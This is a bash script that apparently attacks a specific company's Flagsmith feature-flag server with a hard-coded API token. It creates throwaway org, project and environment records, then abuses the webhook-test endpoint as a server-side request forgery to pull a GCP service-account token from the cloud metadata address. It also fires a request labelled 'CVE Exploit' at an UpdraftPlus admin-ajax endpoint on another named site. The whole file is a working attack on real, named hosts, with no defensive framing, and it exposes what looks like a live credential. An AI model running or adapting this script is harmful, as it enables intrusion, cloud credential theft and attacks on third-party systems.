#!/bin/bash
KEY3="3a05287fd58368ed147cf01376fc107240260143"

# Create org
org=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY3" \
  -H "Content-Type: application/json" \
  -d '{"name":"z3"}' --max-time 10)
OID=$(echo "$org" | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
echo "Org: $OID"

# Create project
PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
  -H "Authorization: Token $KEY3" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
echo "Proj: $PID"

# Create env
EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY3" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
echo "Env: $EKEY"

# Test GCP metadata v1beta1
echo "=== GCP Metadata ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
  -H "Authorization: Token $KEY3" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token"}' \
  --max-time 15
echo ""

# Fire CVE exploit  
echo "=== CVE Exploit ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
  -H "Authorization: Token $KEY3" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_central_receive_message&format=1&key_name=0.central.updraftplus.com&udrpc_message=test_from_github"}' \
  --max-time 15
echo ""
